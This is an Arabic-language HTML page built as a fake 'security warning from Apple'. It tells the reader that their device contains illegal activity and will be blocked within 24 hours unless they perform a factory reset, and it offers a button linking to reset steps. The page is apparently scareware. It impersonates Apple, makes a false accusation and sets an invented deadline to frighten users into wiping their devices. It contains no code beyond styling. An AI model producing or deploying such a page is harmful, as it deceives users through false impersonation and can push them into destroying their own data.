<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحذير أمني</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-color: #fff; color: #000; font-family: sans-serif; padding: 30px; }
        .box { border: 2px solid red; padding: 20px; border-radius: 10px; background: #ffe6e6; }
        h1 { color: red; }
        a.button {
            display: inline-block;
            padding: 10px 20px;
            margin-top: 20px;
            background-color: red;
            color: white;
            text-decoration: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>⚠️ تحذير أمني من Apple</h1>
        <p>جهازك يحتوي على نشاط غير قانوني. يجب عليك فورًا تنفيذ إعادة تعيين المصنع (Factory Reset) أو سيتم حظره من Apple خلال 24 ساعة.</p>
        <a class="button" href="/factory-reset">إظهار خطوات الفورمات</a>
    </div>
</body>
</html>
